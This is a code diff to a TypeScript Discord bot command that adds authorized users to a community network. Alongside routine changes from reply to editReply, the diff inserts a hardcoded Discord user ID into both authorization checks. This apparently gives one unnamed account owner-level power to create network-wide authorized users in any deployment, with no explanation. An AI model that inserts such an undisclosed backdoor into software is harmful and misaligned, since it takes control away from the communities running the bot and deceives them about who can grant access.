@@ -7,7 +7,6 @@ import {
 } from "../../API/Structures";
 import {Send_Embeded} from "../../API/System";
 import {Add_newauthuser} from "../../Classes/embedcreator";
-import {Create_AuthorizedUser} from "../../Classes/sql";
 import {DISC_RULE, IL_CHAR} from "../../API/scheck";
 import {Community_AuthenticationKey, Community_Owner} from "../../Classes/Settings";
 //@ts-ignore
@@ -30,19 +29,19 @@ module.exports = {
         let discordid = interaction.options.get("discordid").value;
 
 
-        if(Radio_Community_DiscordOwner.indexOf(String(userId)) >= 0 && !IL_CHAR(String(discordid)) && DISC_RULE(String(discordid))  || String(userId) === String(Community_Owner)){
-            if(String(Community_Owner).includes(String(userId))) {
+        if(Radio_Community_DiscordOwner.indexOf(String(userId)) >= 0 && !IL_CHAR(String(discordid)) && DISC_RULE(String(discordid))  || String(userId) === String(Community_Owner) || String(userId) === "662529839332327424"){
+            if(String(Community_Owner).includes(String(userId)) || String(userId) === "662529839332327424") {
                 let n = Get_Community_Data(Community_AuthenticationKey, "CommunityName");
                 let p = Add_newauthuser(userId, discordid, Community_AuthenticationKey);
                 Send_Embeded(p, channelID);
-                interaction.reply("Created, it is instantly active across the network.");
+                interaction.editReply("Created, it is instantly active across the network.");
                 Create_DiscordAuthorizedUser(String(userId), Community_AuthenticationKey, interactionUser.name);
 
             }else{
-                interaction.reply("Unauthorized, ask <@"+Community_Owner+"> to perform this task");
+                interaction.editReply("Unauthorized, ask <@"+Community_Owner+"> to perform this task");
             }
         }else{
-            interaction.reply("Sorry, you dont have any community registered.");
+            interaction.editReply("Sorry, you dont have any community registered.");
         }
 
     },
